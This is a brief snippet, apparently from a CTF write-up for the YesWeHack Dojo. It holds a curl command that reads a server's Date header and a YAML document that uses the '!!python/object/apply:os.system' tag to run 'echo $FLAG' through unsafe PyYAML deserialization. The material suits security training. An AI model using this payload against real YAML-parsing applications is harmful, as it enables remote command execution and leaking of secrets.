
````bash
curl -sI https://dojo-yeswehack.com | grep -i '^date:' | cut -d' ' -f2-
````

````bash
firmware:
  version: !!python/object/apply:os.system
  - |
    echo $FLAG
````
